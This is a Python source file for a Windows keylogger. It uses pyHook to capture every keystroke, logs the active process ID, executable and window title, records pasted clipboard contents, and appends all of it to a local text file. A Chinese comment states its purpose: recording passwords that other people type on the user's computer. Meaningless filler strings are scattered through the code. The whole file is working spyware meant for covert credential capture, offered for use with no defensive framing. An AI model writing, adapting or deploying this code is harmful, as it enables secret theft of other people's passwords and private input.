#!encoding:utf-8
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
from os.path import exists
"""  33333333333333333333333333333333333333333
    333333333333333333333333333333333333333333
    windows平台下的本地键盘记录，用于他人在你电脑上输入密码时进行记录
"""
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

log_name = 'log0101.txt'
log_file2 = 'e:\\log0101.txt'
log_file = log_name if exists('C:\\Users\\Administrator\\AppData\\Local\\') else log_file2

def save_msg(content):
     with open(log_file,'a') as f:
        f.writelines(content)

def get_current_process():
    """o0000000000oooooooo00000000"""
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))
    process_id = "%d" % pid.value
    """oooooooo000000000000000000000"""
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
    windows_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)
    log_p = "\n\n[ PID:%s-%s-%s]\n" % (process_id,executable.value,windows_title.value)
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
    return log_p

def KeyStroke(event):
    global current_window

    if event.WindowName != current_window:
        current_window = event.WindowName
        save_msg(get_current_process())
    if event.Ascii > 32 and event.Ascii <127:
        save_msg(chr(event.Ascii))
    else:
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            log_v = "[PASTE]-%s" % (pasted_value)
        else:
            log_v = "[%s]" % event.Key
        save_msg(log_v)
    return True

"""aaaaaAaaaAaAaAAAAaaaaaaaaa"""
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke
"""1111LLLLLLLL1L1LL1LLLLLLLLLLLLLLLLLLLLLLL""" 
kl.HookKeyboard()
pythoncom.PumpMessages()